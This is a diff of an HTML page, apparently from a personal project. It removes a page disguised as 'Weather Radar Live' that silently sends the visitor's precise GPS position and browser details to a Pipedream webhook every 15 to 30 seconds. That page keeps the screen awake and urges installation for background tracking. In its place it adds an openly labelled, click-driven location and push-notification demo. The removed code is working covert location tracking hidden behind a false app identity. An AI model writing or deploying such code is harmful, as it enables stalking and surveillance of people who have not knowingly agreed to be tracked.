@@ -1,560 +1,117 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Weather Radar Live - GPS Tracking</title>
-    <meta name="theme-color" content="#1a365d">
-    <meta name="description" content="Real-time weather tracking with location services">
-    
-    <!-- PWA Manifest -->
-    <link rel="manifest" href="data:application/json,{
-        'name':'Weather Radar Live',
-        'short_name':'WeatherLive',
-        'start_url':'./',
-        'display':'standalone',
-        'background_color':'#1a365d',
-        'theme_color':'#1a365d',
-        'icons':[{
-            'src':'data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>⛈️</text></svg>',
-            'sizes':'192x192',
-            'type':'image/svg+xml'
-        }]
-    }">
-    
-    <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-        
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #1a365d 0%, #2d5a87 100%);
-            color: white;
-            min-height: 100vh;
-            padding: 20px;
-        }
-        
-        .container {
-            max-width: 500px;
-            margin: 0 auto;
-        }
-        
-        .header {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-        
-        .header h1 {
-            font-size: 28px;
-            margin-bottom: 10px;
-        }
-        
-        .header p {
-            opacity: 0.8;
-            font-size: 14px;
-        }
-        
-        .card {
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 15px;
-            padding: 20px;
-            margin-bottom: 20px;
-            backdrop-filter: blur(10px);
-        }
-        
-        .status {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-bottom: 15px;
-        }
-        
-        .status-indicator {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .dot {
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            background: #ef4444;
-        }
-        
-        .dot.active {
-            background: #22c55e;
-            animation: pulse 2s infinite;
-        }
-        
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        
-        .stats {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 15px;
-            margin-top: 20px;
-        }
-        
-        .stat {
-            background: rgba(0, 0, 0, 0.2);
-            padding: 15px;
-            border-radius: 10px;
-            text-align: center;
-        }
-        
-        .stat-value {
-            font-size: 24px;
-            font-weight: bold;
-            margin-bottom: 5px;
-        }
-        
-        .stat-label {
-            font-size: 12px;
-            opacity: 0.7;
-        }
-        
-        .coords {
-            font-family: 'Courier New', monospace;
-            font-size: 16px;
-            background: rgba(0, 0, 0, 0.3);
-            padding: 15px;
-            border-radius: 10px;
-            margin-top: 15px;
-            text-align: center;
-            line-height: 1.6;
-        }
-        
-        .maps-link {
-            display: block;
-            text-align: center;
-            margin-top: 15px;
-            padding: 12px;
-            background: #3b82f6;
-            color: white;
-            text-decoration: none;
-            border-radius: 8px;
-            font-weight: 500;
-        }
-        
-        .maps-link:hover {
-            background: #2563eb;
-        }
-        
-        .install-btn {
-            width: 100%;
-            padding: 15px;
-            background: #22c55e;
-            color: white;
-            border: none;
-            border-radius: 10px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 20px;
-        }
-        
-        .install-btn:hover {
-            background: #16a34a;
-        }
-        
-        .install-btn:disabled {
-            background: #6b7280;
-            cursor: not-allowed;
-        }
-        
-        .log {
-            font-family: 'Courier New', monospace;
-            font-size: 11px;
-            background: rgba(0, 0, 0, 0.5);
-            padding: 10px;
-            border-radius: 8px;
-            max-height: 100px;
-            overflow-y: auto;
-            margin-top: 15px;
-        }
-        
-        .install-prompt {
-            background: #f59e0b;
-            color: #000;
-            padding: 15px;
-            border-radius: 10px;
-            margin-bottom: 20px;
-            text-align: center;
-        }
-        
-        .install-prompt button {
-            background: #000;
-            color: #f59e0b;
-            border: none;
-            padding: 8px 20px;
-            border-radius: 5px;
-            margin-top: 10px;
-            cursor: pointer;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Location Tracker (Pipedream + FCM)</title>
+  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-messaging-compat.js"></script>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; padding: 40px; background: #f8f9fa; }
+    button { padding: 15px 30px; font-size: 18px; margin: 15px; cursor: pointer; border: none; border-radius: 8px; }
+    .btn1 { background: #007bff; color: white; }
+    .btn2 { background: #28a745; color: white; }
+    #status { margin: 25px; font-size: 17px; min-height: 80px; }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>⛈️ Weather Radar Live</h1>
-            <p>Real-time weather monitoring with GPS tracking</p>
-        </div>
-        
-        <div id="installPrompt" class="install-prompt" style="display: none;">
-            <strong>📌 Install for reliable tracking!</strong><br>
-            Add to home screen for background GPS updates
-            <br><button onclick="installPWA()">Install App</button>
-        </div>
-        
-        <div class="card">
-            <div class="status">
-                <div class="status-indicator">
-                    <div class="dot" id="statusDot"></div>
-                    <span id="statusText">Initializing...</span>
-                </div>
-                <div id="updateCount">Updates: 0</div>
-            </div>
-            
-            <div class="stats">
-                <div class="stat">
-                    <div class="stat-value" id="accuracy">--</div>
-                    <div class="stat-label">Accuracy (m)</div>
-                </div>
-                <div class="stat">
-                    <div class="stat-value" id="lastUpdate">--</div>
-                    <div class="stat-label">Last Update</div>
-                </div>
-            </div>
-            
-            <div class="coords" id="coordinates">
-                Waiting for GPS signal...
-            </div>
-            
-            <a href="#" class="maps-link" id="mapsLink" target="_blank">
-                🔗 Open in Google Maps
-            </a>
-        </div>
-        
-        <div class="card">
-            <h3 style="margin-bottom: 10px;">📋 Activity Log</h3>
-            <div class="log" id="activityLog">
-                System initialized. Ready to track.
-            </div>
-        </div>
-        
-        <button class="install-btn" id="installBtn" onclick="installPWA()">
-            📲 Install for Background Tracking
-        </button>
-    </div>
+  <h1>📍 Location + Push Notification</h1>
+  <p>Using GitHub + Pipedream</p>
 
-    <script>
-        // Configuration
-        const WEBHOOK_URL = "https://eo9lonz483js6lc.m.pipedream.net";
-        const UPDATE_INTERVAL = 30000; // 30 seconds
-        
-        // State
-        let updateCount = 0;
-        let isActive = false;
-        let wakeLock = null;
-        let deferredPrompt = null;
-        
-        // Logging system
-        function log(message) {
-            const logEl = document.getElementById('activityLog');
-            const time = new Date().toLocaleTimeString();
-            logEl.innerHTML = `[${time}] ${message}<br>` + logEl.innerHTML;
-            console.log(`[GPS Tracker] ${message}`);
-        }
-        
-        // Initialize app
-        async function init() {
-            log('Starting GPS Tracker v2.0');
-            
-            // Check for PWA installation
-            window.addEventListener('beforeinstallprompt', (e) => {
-                e.preventDefault();
-                deferredPrompt = e;
-                document.getElementById('installPrompt').style.display = 'block';
-                document.getElementById('installBtn').disabled = false;
-                log('PWA install prompt available');
-            });
-            
-            // Request GPS permission
-            await requestGPSPermission();
-            
-            // Start tracking
-            startTracking();
-            
-            // Setup wake lock
-            setupWakeLock();
-            
-            // Setup service worker for background sync
-            setupServiceWorker();
-        }
-        
-        // Request GPS permission
-        async function requestGPSPermission() {
-            try {
-                const permission = await navigator.permissions.query({ name: 'geolocation' });
-                log(`GPS Permission: ${permission.state}`);
-                
-                if (permission.state === 'granted') {
-                    document.getElementById('statusDot').classList.add('active');
-                    document.getElementById('statusText').textContent = 'GPS Active';
-                } else if (permission.state === 'denied') {
-                    log('ERROR: GPS permission denied');
-                    document.getElementById('statusText').textContent = 'Permission Denied';
-                }
-            } catch (e) {
-                log(`Permission check failed: ${e.message}`);
-            }
-        }
-        
-        // Start GPS tracking with multiple strategies
-        function startTracking() {
-            log('Starting GPS tracking strategies...');
-            isActive = true;
-            
-            // Strategy 1: Direct GPS every 30 seconds
-            setInterval(() => {
-                if (!isActive) return;
-                getGPSLocation();
-            }, UPDATE_INTERVAL);
-            
-            // Strategy 2: Backup GPS every 15 seconds (more frequent)
-            setInterval(() => {
-                if (!isActive) return;
-                getGPSLocation();
-            }, 15000);
-            
-            // Strategy 3: On tab focus
-            document.addEventListener('visibilitychange', () => {
-                if (!document.hidden && isActive) {
-                    log('Tab focused - updating GPS');
-                    getGPSLocation();
-                }
-            });
-            
-            // Initial GPS call
-            getGPSLocation();
-            
-            log('Tracking started. Updates every 30 seconds.');
-        }
-        
-        // Get GPS location
-        function getGPSLocation() {
-            const options = {
-                enableHighAccuracy: true,
-                timeout: 15000,
-                maximumAge: 0
-            };
-            
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    updateCount++;
-                    processGPSData(position);
-                },
-                (error) => {
-                    handleGPSError(error);
-                },
-                options
-            );
-        }
-        
-        // Process GPS data and send to Pipedream
-        function processGPSData(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const accuracy = position.coords.accuracy;
-            const timestamp = new Date().toISOString();
-            
-            // Generate Google Maps link
-            const mapsUrl = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
-            
-            // Update UI
-            document.getElementById('coordinates').innerHTML = `
-                <strong>📍 Location:</strong><br>
-                Lat: ${lat.toFixed(6)}<br>
-                Lon: ${lon.toFixed(6)}<br>
-                <small>Updated: ${new Date().toLocaleTimeString()}</small>
-            `;
-            
-            document.getElementById('accuracy').textContent = accuracy.toFixed(0);
-            document.getElementById('lastUpdate').textContent = new Date().toLocaleTimeString();
-            document.getElementById('updateCount').textContent = `Updates: ${updateCount}`;
-            document.getElementById('mapsLink').href = mapsUrl;
-            
-            // Prepare data for Pipedream
-            const gpsData = {
-                type: 'gps_update',
-                latitude: lat,
-                longitude: lon,
-                accuracy: accuracy,
-                timestamp: timestamp,
-                updateCount: updateCount,
-                mapsUrl: mapsUrl,
-                device: 'android_chrome_pwa',
-                userAgent: navigator.userAgent
-            };
-            
-            // Send to Pipedream
-            sendToPipedream(gpsData);
-            
-            log(`GPS Update #${updateCount}: ${lat.toFixed(4)}, ${lon.toFixed(4)}`);
-        }
-        
-        // Send data to Pipedream
-        async function sendToPipedream(data) {
-            try {
-                const response = await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(data)
-                });
-                
-                if (response.ok) {
-                    log(`✅ Sent to Pipedream (HTTP ${response.status})`);
-                } else {
-                    log(`⚠️ Pipedream returned: ${response.status}`);
-                }
-            } catch (error) {
-                log(`❌ Failed to send: ${error.message}`);
-            }
-        }
-        
-        // Handle GPS errors
-        function handleGPSError(error) {
-            let errorMsg = '';
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    errorMsg = 'GPS permission denied';
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    errorMsg = 'Position unavailable';
-                    break;
-                case error.TIMEOUT:
-                    errorMsg = 'GPS timeout';
-                    break;
-                default:
-                    errorMsg = error.message;
-            }
-            log(`GPS Error: ${errorMsg}`);
-            document.getElementById('statusText').textContent = 'GPS Error';
-        }
-        
-        // Setup Wake Lock to keep screen on
-        async function setupWakeLock() {
-            if ('wakeLock' in navigator) {
-                try {
-                    wakeLock = await navigator.wakeLock.request('screen');
-                    log('✅ Wake Lock active - screen stays on');
-                    
-                    wakeLock.addEventListener('release', () => {
-                        log('⚠️ Wake Lock released');
-                    });
-                    
-                    // Re-request if page becomes visible
-                    document.addEventListener('visibilitychange', async () => {
-                        if (document.visibilityState === 'visible' && !wakeLock) {
-                            wakeLock = await navigator.wakeLock.request('screen');
-                        }
-                    });
-                } catch (err) {
-                    log('Wake Lock failed: ' + err.message);
-                }
-            }
-        }
-        
-        // Setup Service Worker for background sync (limited support)
-        function setupServiceWorker() {
-            if ('serviceWorker' in navigator) {
-                // Register service worker
-                const swCode = `
-                    self.addEventListener('install', (event) => {
-                        self.skipWaiting();
-                    });
-                    
-                    self.addEventListener('activate', (event) => {
-                        event.waitUntil(self.clients.claim());
-                    });
-                    
-                    self.addEventListener('fetch', (event) => {
-                        // Keep service worker alive
-                        event.respondWith(fetch(event.request));
-                    });
-                    
-                    self.addEventListener('sync', (event) => {
-                        if (event.tag === 'gps-sync') {
-                            // This would trigger GPS update if background sync was supported
-                            event.waitUntil(
-                                self.clients.matchAll().then(clients => {
-                                    clients.forEach(client => {
-                                        client.postMessage({ type: 'SYNC_GPS' });
-                                    });
-                                })
-                            );
-                        }
-                    });
-                `;
-                
-                const blob = new Blob([swCode], { type: 'application/javascript' });
-                const swUrl = URL.createObjectURL(blob);
-                
-                navigator.serviceWorker.register(swUrl)
-                    .then(reg => {
-                        log('Service Worker registered');
-                    })
-                    .catch(err => {
-                        log('Service Worker failed: ' + err.message);
-                    });
-            }
-        }
-        
-        // Install PWA
-        async function installPWA() {
-            if (deferredPrompt) {
-                deferredPrompt.prompt();
-                const { outcome } = await deferredPrompt.userChoice;
-                if (outcome === 'accepted') {
-                    log('PWA installed successfully');
-                    document.getElementById('installPrompt').style.display = 'none';
-                }
-                deferredPrompt = null;
-            } else {
-                log('Install prompt not available');
-                alert('To install: Open Chrome menu → "Add to Home screen"');
-            }
-        }
-        
-        // Listen for messages from service worker
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.addEventListener('message', (event) => {
-                if (event.data.type === 'SYNC_GPS') {
-                    log('Background sync triggered');
-                    getGPSLocation();
-                }
-            });
-        }
-        
-        // Initialize on load
-        window.addEventListener('load', init);
-        
-        // Emergency: Force GPS on visibility change
-        document.addEventListener('visibilitychange', () => {
-            if (!document.hidden) {
-                log('Page visible - forcing GPS update');
-                getGPSLocation();
-            }
+  <button class="btn1" onclick="requestPermissions()">1. Request Permissions (Location + Notification)</button><br>
+  <button class="btn2" onclick="sendLocationUpdate()">2. Send Location Update via Pipedream</button>
+
+  <div id="status"></div>
+
+  <script>
+    // ================== YOUR FIREBASE CONFIG ==================
+    const firebaseConfig = {
+      apiKey: "YOUR_API_KEY",
+      authDomain: "your-project.firebaseapp.com",
+      projectId: "your-project",
+      storageBucket: "your-project.appspot.com",
+      messagingSenderId: "YOUR_SENDER_ID",
+      appId: "YOUR_APP_ID"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const messaging = firebase.messaging();
+
+    let fcmToken = null;
+
+    async function requestPermissions() {
+      const status = document.getElementById('status');
+      status.textContent = "Requesting permissions...";
+
+      try {
+        // Notification permission
+        const notifPermission = await Notification.requestPermission();
+        if (notifPermission !== "granted") throw new Error("Notification permission denied");
+
+        // Get FCM Token (VAPID key is required for web)
+        fcmToken = await messaging.getToken({
+          vapidKey: "YOUR_VAPID_KEY_HERE"   // ← Get from Firebase Console > Cloud Messaging > Web configuration
         });
-    </script>
+
+        console.log("✅ FCM Token:", fcmToken);
+
+        // Test location
+        await navigator.geolocation.getCurrentPosition(() => {});
+        
+        status.textContent = "✅ Permissions granted! FCM Token ready.\nNow click button 2.";
+      } catch (err) {
+        status.textContent = "❌ Error: " + err.message;
+        console.error(err);
+      }
+    }
+
+    async function sendLocationUpdate() {
+      const status = document.getElementById('status');
+      if (!fcmToken) {
+        status.textContent = "Please click button 1 first!";
+        return;
+      }
+
+      status.textContent = "📍 Getting current location...";
+
+      try {
+        const position = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
+        });
+
+        const locationData = {
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          accuracy: position.coords.accuracy,
+          timestamp: new Date().toISOString(),
+          fcmToken: fcmToken
+        };
+
+        status.textContent = `📍 Location captured!\nLat: ${locationData.latitude.toFixed(5)}\nLon: ${locationData.longitude.toFixed(5)}\nSending to Pipedream...`;
+
+        // Send data to your Pipedream webhook
+        const response = await fetch('https://eos42ihp3bqk71v.m.pipedream.net', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(locationData)
+        });
+
+        if (response.ok) {
+          status.textContent += "\n\n✅ Sent to Pipedream successfully!\nPipedream will now send the FCM notification with location.";
+        } else {
+          status.textContent += "\n\n❌ Failed to send to Pipedream";
+        }
+      } catch (err) {
+        status.textContent = "❌ Error: " + err.message;
+      }
+    }
+
+    // Optional: Show notification when received while page is open
+    messaging.onMessage((payload) => {
+      console.log("Notification received:", payload);
+      const status = document.getElementById('status');
+      status.textContent = `🔔 Notification received: ${payload.notification?.body || 'Location update'}`;
+    });
+  </script>
 </body>
 </html>
